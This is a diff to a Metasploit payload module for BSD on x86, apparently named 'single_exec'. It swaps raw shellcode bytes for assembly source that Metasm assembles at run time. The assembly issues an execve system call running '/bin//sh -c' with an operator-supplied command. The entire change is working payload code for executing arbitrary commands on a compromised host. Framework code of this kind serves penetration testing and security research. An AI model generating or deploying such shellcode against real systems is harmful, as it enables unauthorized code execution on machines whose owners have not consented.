@@ -48,12 +48,54 @@ module Metasploit3
 	#
 	def generate_stage
 		cmd     = datastore['CMD'] || ''
-		payload =
-			"\x6a\x3b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52" +
-			"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3" +
-			"\x52" +
-			Rex::Arch::X86.call(cmd.length) + cmd + "\x00"     +
-			"\x57\x53\x89\xe1\x52\x51\x53\x50\xcd\x80"
+		asm = <<-EOS
+;;
+;
+;        Name: single_exec
+;   Platforms: *BSD 
+;     Authors: vlad902 <vlad902 [at] gmail.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Execute an arbitary command.
+;
+;;
+; NULLs are fair game.
+
+  push	0x3b
+  pop	eax
+  cdq
+
+  push	edx
+  push	0x632d
+  mov	edi, esp
+
+  push	edx
+  push	0x68732f6e
+  push	0x69622f2f
+  mov	ebx, esp
+
+  push	edx
+  call	getstr
+db "CMD", 0x00
+getstr:
+  push	edi
+  push	ebx
+  mov	ecx, esp
+  push	edx
+  push	ecx
+  push	ebx
+  push	eax
+  int	0x80
+EOS
+		asm.gsub!(/CMD/, cmd.gsub('"', "\\\""))
+		payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
 	end
 
 end
